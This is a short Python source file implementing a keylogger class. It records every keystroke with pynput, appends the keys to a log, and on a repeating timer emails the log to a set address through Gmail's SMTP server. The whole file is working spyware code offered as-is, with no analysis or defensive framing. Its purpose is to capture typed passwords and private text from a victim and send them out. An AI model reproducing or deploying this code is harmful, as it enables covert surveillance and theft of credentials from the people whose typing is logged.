import pynput.keyboard
import threading
import smtplib

log = " "

class keylogger:
    
    def __init__(self, time, email, password):
        self.log = " "
        self.time = time
        self.email = email
        self.password = password

    

    def conctt_log(self, string):
        self.log = self.log + string

    def get_key(self, key):
        
        try:
            pres_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pres_key = " "
            else:
                pres_key = " " + str(key) + " "

        self.conctt_log(pres_key)

    def report(self):
       
        self.send_message(self.email, self.password, self.log)
        self.log = " "
        timer = threading.Timer(self.time, self.report)
        timer.start()

    def send_message(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email, email, message)
        server.quit()


    def start(self):
        keyboard_listen = pynput.keyboard.Listener(on_press = self.get_key)
        with keyboard_listen:
            self.report()
            keyboard_listen.join()



